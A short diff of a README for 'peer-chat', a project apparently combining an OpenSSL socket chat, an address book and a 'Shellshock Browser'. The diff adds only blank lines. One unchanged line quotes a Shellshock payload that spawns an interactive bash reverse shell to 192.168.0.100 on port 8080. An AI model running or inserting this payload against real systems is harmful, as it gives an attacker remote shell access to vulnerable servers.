@@ -1,11 +1,14 @@
 # peer-chat
 * Server and Client OpenSSL Peer Socket Chat (Windows/Linux)
+
     most Bug free
     
 * Addressbook functionality (Windows/Linux)
+
     Entry has Bugs
     
 * http/https Shellshock Browser (Windows/Linux)
+
     the Shellshock it self: "env x='() { :;}; ' $(command -v bash) -i >& /dev/tcp/192.168.0.100/8080 0>&1"
 
 # building
